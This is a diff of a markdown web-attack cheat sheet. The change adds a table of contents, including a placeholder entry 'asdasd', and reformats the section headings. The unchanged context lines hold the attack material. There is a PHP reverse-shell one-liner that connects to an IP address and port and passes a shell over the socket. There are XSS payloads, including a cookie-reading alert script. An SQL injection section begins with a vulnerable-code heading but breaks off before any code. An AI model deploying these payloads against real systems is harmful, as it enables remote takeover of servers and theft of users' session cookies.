@@ -1,5 +1,10 @@
 # WEB
 
+# Table of contents
+1. [XSS](# cross site)
+2. [asdasd](# asdasd)
+
+
 PHP
 ---
 
@@ -9,8 +14,8 @@ Reverse shell one-liners:
 <?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>
 
 
-XSS (CROSS SITE SCRIPTING)
---------------------------
+## XSS (CROSS SITE SCRIPTING)
+-----------------------------
 
 ```javascript
 <script>alert("XSS")</script>
@@ -21,8 +26,8 @@ iframe: `<iframe src="http://www.cnn.com"></iframe>`
 Stored cookie: `<script>alert(document.cookie)</script>`
 
 
-SQL INJECTION
--------------
+## SQL INJECTION
+----------------
 
 Vulenrable code example:
 
